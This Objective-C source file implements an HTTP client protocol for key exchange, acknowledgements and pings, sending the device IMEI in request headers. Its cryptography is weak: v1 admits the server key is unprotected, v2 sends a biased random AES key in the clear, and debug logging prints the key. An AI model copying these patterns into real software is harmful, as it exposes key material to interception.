//
//  UnstructuredManager.m
//  PhoenixComponent
//
//  Created by Pichaya Srifar on 7/18/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "UnstructuredManager.h"
#import "UnstructProtParser.h"

#import "CSMDeviceManager.h"
#import "ASIHTTPRequest.h"
#import "SystemUtilsImpl.h"
#import "NSData+HexString.h"

/*
static NSString *TAG =@"UnstructuredManager";
static BOOL DEBUG = YES;
static int HTTP_TIME_OUT = (1*60*1000);
static int THREAD_TIME_OUT = (1*60*1000);
*/

@interface UnstructuredManager (private)
+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest commandCode: (unsigned short) aCommandCode;
@end


@implementation UnstructuredManager

@synthesize URL;
@synthesize HTTPErrorMsg;

- (UnstructuredManager *) init {
	self = [super init];
	if(self) {
		[self setURL:[NSURL URLWithString:@""]];
	}
	return self;
}

- (UnstructuredManager *)initWithURL:(NSURL *)url {
	self = [super init];
	if (self) {
		[self setURL:url];
	}
	return self;
}

// Initial key exchange protocol no security measure to protect server public key
- (KeyExchangeResponse *)doKeyExchangev1:(unsigned short)code withEncodingType:(unsigned short)encodeType {
	NSData *postData = [UnstructProtParser parseKeyExchangeRequest:code withEncodingType:encodeType];
	
	DLog(@"postData %@", postData);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request commandCode:KEY_EXCHANGE_CMD_CODE];
    //[request.postBody writeToFile:[NSTemporaryDirectory() stringByAppendingPathComponent:@"k-exch-v1.dat"] atomically:YES];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData %@", responseData);
	
	KeyExchangeResponse *result = nil;
	NSError *error = [request error];
	DLog(@"responseData length = %lu, error domain %@", (unsigned long)[responseData length], [error domain]);
	
	if (error || [responseData length] == 0) {
		DLog(@"doKeyExchange error %@", error);
		result = [[KeyExchangeResponse alloc] init];
		[result setIsOK:NO];
		return [result autorelease];
	}
	
	result = [UnstructProtParser parseKeyExchangeResponse:responseData];
	
	return result;
}


// Use random AES key to server and then decrypt the response data with partial key plus tail
- (KeyExchangeResponse *)doKeyExchangev2:(unsigned short)code withEncodingType:(unsigned short)encodeType {
	NSData *postData = [UnstructProtParser parseKeyExchangeRequest:code withEncodingType:encodeType];
		
	DLog(@"postData %@", postData);

	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];

	NSMutableData *keyData = [NSMutableData data];
	for (NSInteger i = 0; i < 16; i++) {
		unsigned char byte = (unsigned char)((arc4random() % 255));
		[keyData appendBytes:&byte length:sizeof(unsigned char)];
	}
	
	uint16_t lengthKey = [keyData length];
	lengthKey = htons(lengthKey);
	[request appendPostData:[NSData dataWithBytes:&lengthKey length:sizeof(uint16_t)]];
	[request appendPostData:keyData];
	
	DLog (@"keyData = %@", keyData);
    
    [UnstructuredManager setHttpRequestHeaders:request commandCode:KEY_EXCHANGE_CMD_CODE];
    //[request.postBody writeToFile:[NSTemporaryDirectory() stringByAppendingPathComponent:@"k-exch-v2.dat"] atomically:YES];

	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData %@", responseData);

	KeyExchangeResponse *result = nil;
	NSError *error = [request error];
	DLog(@"responseData length = %lu, error domain %@", (unsigned long)[responseData length], [error domain]);

	if (error || [responseData length] == 0) {
		DLog(@"doKeyExchange error %@", error);
		result = [[KeyExchangeResponse alloc] init];
		[result setIsOK:NO];
		return [result autorelease];
	}
	
	result = [UnstructProtParser parseKeyExchangeResponse:responseData withKey:keyData];

	return result;
}

- (AckSecResponse *)doAckSecure:(unsigned short)code withSessionId:(unsigned int)sessionId {
	NSData *postData = [UnstructProtParser parseAckSecureRequest:code withSessionId:sessionId];
	
	DLog(@"postData = %@", postData);

	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request commandCode:ACK_SEC_CMD_CODE];
    //[request.postBody writeToFile:[NSTemporaryDirectory() stringByAppendingPathComponent:@"ack-sec.dat"] atomically:YES];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData = %@", responseData);
	AckSecResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		result = [[AckSecResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parseAckSecureResponse:responseData];
	}
	return result;
}

- (AckResponse *)doAck:(unsigned short)code withSessionId:(unsigned int)sessionId withDeviceId:(NSString *)deviceId {
	NSData *postData = [UnstructProtParser parseAckRequest:code withSessionId:sessionId withDeviceId:deviceId];
	
	DLog(@"doAck postData = %@", postData);
    DLog(@"doAck code: %d, sessionId: %d, deviceId: %@", code, sessionId, deviceId);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request commandCode:ACK_CMD_CODE];
    //[request.postBody writeToFile:[NSTemporaryDirectory() stringByAppendingPathComponent:@"ack.dat"] atomically:YES];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"reponseData = %@", responseData);
	AckResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		// Cannot rely on only error.... since some situation no error but data length is 0
		// which cause crash in parsing the data
		result = [[AckResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parseAckResponse:responseData];
	}
	DLog(@"result = %@", result);
	return result;
}

- (PingResponse *)doPing:(unsigned short)code {
	NSData *postData = [UnstructProtParser parsePingRequest:code];
	
	DLog(@"postData = %@", postData);
	
	ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:[self URL]];
	
	[request setRequestMethod:@"POST"];
	[request appendPostData:postData];
	[request setTimeOutSeconds:60];
	[UnstructuredManager setHttpRequestHeaders:request commandCode:PING_CMD_CODE];
    //[request.postBody writeToFile:[NSTemporaryDirectory() stringByAppendingPathComponent:@"ping.dat"] atomically:YES];
	
	[request startSynchronous];
	NSData *responseData = [request responseData];
	DLog(@"responseData = %@", responseData);
	PingResponse *result = nil;
	if ([request error] || [responseData length] == 0) {
		result = [[PingResponse alloc] init];
		[result setIsOK:NO];
		[result autorelease];
	} else {
		result = [UnstructProtParser parsePingResponse:responseData];
	}
	return result;
}

+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest commandCode: (unsigned short) aCommandCode {
	DLog (@"[UnstructuredManager] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
	
    // -- owner
	CSMDeviceManager *csmDeviceManager = [CSMDeviceManager sharedCSMDeviceManager];
	[aASIHttpRequest addRequestHeader:@"owner" value:[csmDeviceManager mIMEI]];
	// -- User-Agent
	NSBundle *bundle = [NSBundle mainBundle];
	NSDictionary *bundleInfo = [bundle infoDictionary];
	NSString *client = [NSString stringWithFormat:@"Client %@", [bundleInfo objectForKey:@"CFBundleVersion"]];
	NSString *os = nil;
    NSString *platform = nil;
#if TARGET_OS_IPHONE
    os = [NSString stringWithFormat:@"iOS %@", [[UIDevice currentDevice] systemVersion]];
    if ([SystemUtilsImpl isIpad]) {
        platform = @"iPad";
    } else {
        platform = @"iPhone";
    }
#else
    NSString *systemVersion = @"";
    NSDictionary *systemVersionInfo	= [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
    if (systemVersionInfo) {
        systemVersion = [systemVersionInfo objectForKey:@"ProductVersion"];
    }
    os = [NSString stringWithFormat:@"macOS %@", systemVersion];
    platform = @"Mac";
#endif
	NSString *model = [SystemUtilsImpl deviceModelVersion];
	NSString *userAgent = [NSString stringWithFormat:@"%@; %@; %@", client, os, model];
	[aASIHttpRequest addRequestHeader:@"User-Agent" value:userAgent];
	// -- Connection
	[aASIHttpRequest addRequestHeader:@"Connection" value:@"close"];
    // -- platform
    [aASIHttpRequest addRequestHeader:@"platform" value:platform];
    // -- clientVersion
    [aASIHttpRequest addRequestHeader:@"clientVersion" value:[bundleInfo objectForKey:@"CFBundleVersion"]];
    // -- commandCode
    [aASIHttpRequest addRequestHeader:@"commandCode" value:[NSString stringWithFormat:@"%d", aCommandCode]];
    // -- ​payloadLength
    [aASIHttpRequest addRequestHeader:@"payloadLength" value:[NSString stringWithFormat:@"%lu", (unsigned long)aASIHttpRequest.postBody.length]];
    // -- ​payload
	[aASIHttpRequest addRequestHeader:@"payload" value:[aASIHttpRequest.postBody hexadecimalString]];
    
    [aASIHttpRequest buildRequestHeaders];
	DLog (@"[UnstructuredManager] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
}

- (void) dealloc {
	[URL release];
	[HTTPErrorMsg release];
	[super dealloc];
}

@end
